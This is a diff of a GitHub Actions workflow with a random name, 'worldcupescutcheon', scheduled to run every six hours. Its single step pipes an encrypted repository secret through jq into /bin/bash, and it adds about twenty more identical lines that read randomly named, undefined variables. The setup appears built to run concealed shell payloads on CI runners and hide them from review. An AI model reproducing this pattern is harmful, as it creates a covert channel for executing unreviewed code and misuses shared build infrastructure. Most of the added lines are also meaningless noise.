@@ -1,27 +1,38 @@
 name: worldcupescutcheon
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
+    - cron: '3 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: worldcupescutcheon
         env:
-          x23820: ${{ secrets.x23820 }}
+          auekp48: ${{ secrets.auekp48 }}
         run: |
-          echo $x23820 | jq -r .dfzn484 | /bin/bash
-          echo $nx39790 | jq -r .ixlpq60 | /bin/bash
-          echo $f5 | jq -r .duzq2886 | /bin/bash
-          echo $chmki66 | jq -r .hjk77 | /bin/bash
-          echo $exvae7855 | jq -r .kri54 | /bin/bash
-          echo $jctk4 | jq -r .bvqb1 | /bin/bash
-          echo $uqti459 | jq -r .w39269 | /bin/bash
-          echo $itdn0 | jq -r .nhezn96060 | /bin/bash
-          echo $sx97 | jq -r .rldxf17168 | /bin/bash
-          echo $iq22 | jq -r .rfns33 | /bin/bash
-          echo $kqbf0143 | jq -r .mw4 | /bin/bash
+          echo $auekp48 | jq -r .uhev17372 | /bin/bash
+          echo $zkhnq07292 | jq -r .naxfu7093 | /bin/bash
+          echo $gqwdx1202 | jq -r .v33274 | /bin/bash
+          echo $npl26773 | jq -r .iiql02 | /bin/bash
+          echo $rr0239 | jq -r .u01362 | /bin/bash
+          echo $aby02436 | jq -r .uku0106 | /bin/bash
+          echo $zdhon0534 | jq -r .u5027 | /bin/bash
+          echo $zi566 | jq -r .nfo366 | /bin/bash
+          echo $khfmu757 | jq -r .riau651 | /bin/bash
+          echo $j0338 | jq -r .awuw264 | /bin/bash
+          echo $rsayu855 | jq -r .yhx84469 | /bin/bash
+          echo $bb1 | jq -r .d0408 | /bin/bash
+          echo $wnca696 | jq -r .x6515 | /bin/bash
+          echo $g52828 | jq -r .fland7 | /bin/bash
+          echo $plgr0872 | jq -r .w0361 | /bin/bash
+          echo $m9 | jq -r .tfedm884 | /bin/bash
+          echo $z327 | jq -r .xuko1 | /bin/bash
+          echo $qom6714 | jq -r .ic6 | /bin/bash
+          echo $yrzoh5267 | jq -r .w93 | /bin/bash
+          echo $j0 | jq -r .mua2 | /bin/bash
+          echo $ihpq40695 | jq -r .nndv9917 | /bin/bash
 
